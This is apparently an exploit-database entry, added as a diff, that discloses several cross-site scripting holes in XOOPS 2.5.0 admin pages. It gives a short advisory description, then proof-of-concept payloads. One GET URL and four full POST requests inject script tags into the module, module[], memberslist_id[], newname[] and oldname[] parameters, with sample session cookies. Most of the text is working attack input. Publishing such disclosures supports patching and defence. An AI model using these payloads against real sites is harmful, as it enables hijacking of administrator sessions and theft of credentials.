@@ -1,0 +1,78 @@
+source: http://www.securityfocus.com/bid/46916/info
+
+XOOPS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+XOOPS 2.5.0 is vulnerable; other versions may also be affected. 
+
+Parameter: module
+
+http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin&op=install&module=pm%3Cimg%20src=a%20onerror=alert%28String.fromCharCode%2888,83,83%29%29%3Eaawe
+
+
+Parameter: module[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1"><script>alert(1)</script>&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System
+[/REQUEST]
+
+
+Parameter: memberslist_id[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=users&selgroups=2
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+memberslist_id%5b%5d="><script>alert(1)</script>&op=action_group&Submit=&selgroups=1&fct=mailusers&edit_group=add_group
+[/REQUEST]
+
+
+Parameter: newname[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System"><script>alert(1)</script>
+[/REQUEST]
+
+
+Parameter: oldname[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System"><script>alert(1)</script>1bf8581e3dc&fct=modulesadmin&newname%5b1%5d=System
+[/REQUEST]
+
+
+
